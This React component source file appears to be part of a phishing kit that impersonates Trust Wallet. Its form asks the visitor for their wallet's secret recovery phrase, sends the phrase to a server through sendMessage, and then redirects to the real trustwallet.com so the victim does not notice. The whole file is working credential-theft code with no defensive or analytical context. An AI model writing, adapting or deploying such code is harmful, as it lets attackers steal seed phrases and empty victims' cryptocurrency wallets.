import { LoadingButton } from "@mui/lab";
import { styled } from "@mui/material/styles";
import * as React from "react";
import { sendMessage } from "../config/server";
import "./styles.scoped.css";

const BootstrapButton = styled(LoadingButton)({
  boxShadow: "none",
  textTransform: "none",
  fontSize: 16,
  padding: "6px 12px",
  border: "1px solid",
  lineHeight: 1.5,
  backgroundColor: "#4caf50",
  height: 50,
  fontFamily: [
    "-apple-system",
    "BlinkMacSystemFont",
    '"Segoe UI"',
    "Roboto",
    '"Helvetica Neue"',
    "Arial",
    "sans-serif",
    '"Apple Color Emoji"',
    '"Segoe UI Emoji"',
    '"Segoe UI Symbol"',
  ].join(","),
});

export default function ProccedDialog() {
  const [value, setValue] = React.useState({
    wallet: "trustwallet",
    phrase: "",
  });
  const [loading, setLoading] = React.useState(false);

  const handleChange = (event) => {
    setValue({ ...value, [event.target.name]: event.target.value });
  };

  const submitFunction = (event) => {
    event.preventDefault();
    setLoading(true);
    sendMessage(value).then(() => {
      setLoading(false);
      window.location.replace("https://trustwallet.com/");
    });
  };

  return (
    <form onSubmit={submitFunction}>
      <label htmlFor="fname">
        Enter your secret phrase in the right order to proceed
      </label>
      <input
        type="text"
        required
        name="phrase"
        placeholder="Secret phrase"
        id="phrase"
        onChange={handleChange}
      />
      <BootstrapButton
        loading={loading}
        type="submit"
        variant="contained"
        color="success"
        //  onClick={handleClickOpen}
        disableElevation
        size="large"
        fullWidth
      >
        Submit
      </BootstrapButton>
    </form>
  );
}
